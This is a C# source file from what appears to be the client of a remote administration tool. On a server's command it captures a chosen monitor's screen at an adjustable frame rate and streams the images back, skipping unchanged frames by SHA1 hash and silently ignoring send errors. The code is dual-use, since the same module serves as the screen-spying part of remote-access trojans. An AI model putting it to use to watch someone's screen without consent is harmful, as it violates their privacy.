using Client.Core.Helper;
using Client.Core.Networking;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Shared;
using Shared.Helper;
using Shared.Enums;
using Shared.Objects;
using Client.Config;
using System.Security.Cryptography;

namespace Client.Core.Events
{
    class SubmitScreen
    {
        public static bool isSubmitting;
        public static int FramesPerSecond = 10;
        public static int CurrentMonitor;

        private static string lastScreenshotHash;

        private static Thread submitThread;

        public static void Execute(string data)
        {
            SubmitScreenStatus submitObj = JsonConvert.DeserializeObject<SubmitScreenStatus>(data);
            switch (submitObj.Type)
            {
                case SubmitScreenStatusE.ChangeRefresh:
                    FramesPerSecond = submitObj.Refresh;
                    CurrentMonitor = submitObj.Monitor;
                    break;
                case SubmitScreenStatusE.StartSubmit:
                    if (!isSubmitting)
                    {
                        isSubmitting = true;
                        FramesPerSecond = submitObj.Refresh;
                        CurrentMonitor = submitObj.Monitor;
                        submitThread = new Thread(SubmitThread);
                        submitThread.Start();
                    }
                    break;
                case SubmitScreenStatusE.StopSubmit:
                    if (isSubmitting)
                    {
                        isSubmitting = false;
                        FramesPerSecond = submitObj.Refresh;
                        CurrentMonitor = submitObj.Monitor;
                        submitThread.Abort();
                    }
                    break;
                case SubmitScreenStatusE.ChangeMonitor:
                    FramesPerSecond = submitObj.Refresh;
                    CurrentMonitor = submitObj.Monitor;
                    break;
            }
        }


        public static void SubmitThread()
        {
            while(true)
            {
                if(isSubmitting)
                {

                    if(Settings.HASH_OPTIMIZE_SCREEN_SEND)
                    {
                        byte[] toSend = BitmapConvert.imageToByteArray(ScreenshotHelper.TakeScreenshot(CurrentMonitor));
                        string toSendHash;

                        using (SHA1CryptoServiceProvider sha1 = new SHA1CryptoServiceProvider())
                        {
                            toSendHash = Convert.ToBase64String(sha1.ComputeHash(toSend));
                        }
                        if(toSendHash != lastScreenshotHash)
                        {
                            //Something has changed.
                            lastScreenshotHash = toSendHash;
                            try
                            {
                                NetworkManager.Connection.SendObject<byte[]>("1x08", toSend);
                            }
                            catch
                            {

                            }
                        }
                    }
                    else
                    {
                        try
                        {
                            NetworkManager.Connection.SendObject<byte[]>("1x08", BitmapConvert.imageToByteArray(ScreenshotHelper.TakeScreenshot(CurrentMonitor)));
                        }
                        catch
                        {

                        }
                    }
                }
                if (FramesPerSecond > 0)
                    Thread.Sleep((int)(((1d / (double)FramesPerSecond) * 1000)));
            }
        }
    }
}
